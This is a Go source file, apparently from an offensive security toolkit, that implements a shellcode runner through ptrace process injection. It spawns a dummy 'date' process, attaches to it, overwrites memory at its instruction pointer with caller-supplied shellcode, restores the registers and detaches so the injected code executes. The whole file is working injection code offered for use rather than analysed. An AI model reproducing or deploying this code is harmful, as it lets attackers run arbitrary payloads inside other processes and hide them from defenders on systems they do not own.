package shellcode

import (
	"fmt"
	"os/exec"
	"syscall"
)

// Runner runner
func Runner(shellcode []byte) bool {
	tPid := generateDummyProcess()
	attachToProcessAndWait(tPid)
	registers := getRegisters(tPid)
	pcPtr := uintptr(registers.PC())
	copyShellcode(tPid, shellcode, pcPtr)
	setRegisters(tPid, registers)
	detachFromProcess(tPid)
	return true
}

// IsAvailable does a shellcode runner exist
func IsAvailable() bool {
	return true
}

func generateDummyProcess() int {
	// var tPid = 1461
	fmt.Println("[+] Generate dummy process")
	cmd := exec.Command("date")
	cmdErr := cmd.Start()
	if cmdErr != nil {
		panic(cmdErr.Error())
	}
	return cmd.Process.Pid
}

func attachToProcessAndWait(tPid int) {
	attachErr := syscall.PtraceAttach(tPid)
	if attachErr != nil {
		fmt.Println("[-] Attaching to process failed")
		panic(attachErr.Error())
	}
	var status syscall.WaitStatus
	_, err := syscall.Wait4(tPid, &status, syscall.WALL, nil)
	if err != nil {
		panic(err.Error())
	}
}

func detachFromProcess(tPid int) {
	fmt.Println("[+] Execute shellcode")
	detachErr := syscall.PtraceDetach(tPid)
	if detachErr != nil {
		panic(detachErr.Error())
	}
}

func copyShellcode(pid int, shellcode []byte, dst uintptr) {
	_, err := syscall.PtracePokeData(pid, dst, shellcode)
	if err != nil {
		panic(err.Error())
	}
}

func getRegisters(pid int) syscall.PtraceRegs {
	var regs syscall.PtraceRegs
	err := syscall.PtraceGetRegs(pid, &regs)
	if err != nil {
		fmt.Println("[-] Getting process registers failed")
		panic(err.Error())
	}
	return regs
}

func setRegisters(pid int, regs syscall.PtraceRegs) {
	err := syscall.PtraceSetRegs(pid, &regs)
	if err != nil {
		fmt.Println("[-] Setting process registers failed")
		panic(err.Error())
	}
}
